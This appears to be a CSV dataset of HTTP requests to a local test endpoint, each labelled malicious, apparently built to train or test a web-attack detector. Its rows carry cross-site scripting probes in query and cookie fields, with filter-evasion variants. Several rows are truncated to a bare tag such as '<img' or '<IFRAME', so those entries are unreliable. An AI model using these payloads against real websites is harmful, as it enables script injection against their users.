method,url,uri,query,headers,body,type
POST,/example,/example,"p1=p1val&p2=""><script>prompt(299792458)</script>","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>alert(299792458)</script><""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>console.log(299792458)</script><""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>confirm(299792458)</script><""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""><script>prompt(299792458)</script><""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>alert(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>console.log(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>confirm(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>prompt(299792458)</script>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>alert(299792458)</script><',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>console.log(299792458)</script><',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>confirm(299792458)</script><',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='><script>prompt(299792458)</script><',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCRIPT>alert(299792458);</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCRIPT>console.log(299792458);</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCRIPT>confirm(299792458);</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCRIPT>prompt(299792458);</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scri<script>pt>alert(299792458);</scr</script>ipt>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scri<script>pt>console.log(299792458);</scr</script>ipt>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scri<script>pt>confirm(299792458);</scr</script>ipt>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scri<script>pt>prompt(299792458);</scr</script>ipt>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCRI<script>PT>alert(299792458);</SCR</script>IPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCRI<script>PT>console.log(299792458);</SCR</script>IPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCRI<script>PT>confirm(299792458);</SCR</script>IPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCRI<script>PT>prompt(299792458);</SCR</script>IPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scri<scr<script>ipt>pt>alert(299792458);</scr</sc</script>ript>ipt>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scri<scr<script>ipt>pt>console.log(299792458);</scr</sc</script>ript>ipt>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scri<scr<script>ipt>pt>confirm(299792458);</scr</sc</script>ript>ipt>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<scri<scr<script>ipt>pt>prompt(299792458);</scr</sc</script>ript>ipt>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2="";alert(299792458);""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2="";console.log(299792458);""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2="";confirm(299792458);""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2="";prompt(299792458);""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=';alert(299792458);',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=';console.log(299792458);',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=';confirm(299792458);',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=';prompt(299792458);',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=;alert(299792458);,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=;console.log(299792458);,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=;confirm(299792458);,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=;prompt(299792458);,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=alert(299792458);,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=console.log(299792458);,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=confirm(299792458);,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=prompt(299792458);,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCR%00IPT>alert(299792458)</SCR%00IPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCR%00IPT>console.log(299792458)</SCR%00IPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCR%00IPT>confirm(299792458)</SCR%00IPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<SCR%00IPT>prompt(299792458)</SCR%00IPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=\"";alert(299792458);//","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=\"";console.log(299792458);//","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=\"";confirm(299792458);//","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=\"";prompt(299792458);//","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<STYLE,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<STYLE,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<STYLE,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<STYLE,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<<SCRIPT>alert(299792458)//<</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<<SCRIPT>console.log(299792458)//<</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<<SCRIPT>confirm(299792458)//<</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<<SCRIPT>prompt(299792458)//<</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmousemove=alert(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmouseout=alert(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmouseover=alert(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmousemove=console.log(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmouseout=console.log(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmouseover=console.log(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmousemove=confirm(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmouseout=confirm(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmouseover=confirm(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmousemove=prompt(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmouseout=prompt(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""onmouseover=prompt(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<<SCRIPT>alert(299792458)//<</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<<SCRIPT>console.log(299792458)//<</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<<SCRIPT>confirm(299792458)//<</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<<SCRIPT>prompt(299792458)//<</SCRIPT>,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<img,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=onerror=""alert(299792458)""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=onerror=""console.log(299792458)""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=onerror=""confirm(299792458)""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=onerror=""prompt(299792458)""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=onerror='alert(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=onerror='console.log(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=onerror='confirm(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=onerror='prompt(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=onload=""alert(299792458)""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=onload=""console.log(299792458)""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=onload=""confirm(299792458)""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=onload=""prompt(299792458)""","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=onload='alert(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=onload='console.log(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=onload='confirm(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=onload='prompt(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IMG,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""""""><SCRIPT>alert(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""""""><SCRIPT>console.log(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""""""><SCRIPT>confirm(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=p1val&p2=""""""><SCRIPT>prompt(299792458)","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='''><SCRIPT>alert(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='''><SCRIPT>console.log(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='''><SCRIPT>confirm(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2='''><SCRIPT>prompt(299792458)',"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=<IFRAME,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<script>alert(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<script>console.log(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<script>confirm(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<script>prompt(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scr ipt>alert(299792458)</scr ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scr ipt>console.log(299792458)</scr ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scr ipt>confirm(299792458)</scr ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scr ipt>prompt(299792458)</scr ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""><script>alert(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""><script>console.log(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""><script>confirm(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""><script>prompt(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""><script>alert(299792458)</script><""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""><script>console.log(299792458)</script><""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""><script>confirm(299792458)</script><""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""><script>prompt(299792458)</script><""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='><script>alert(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
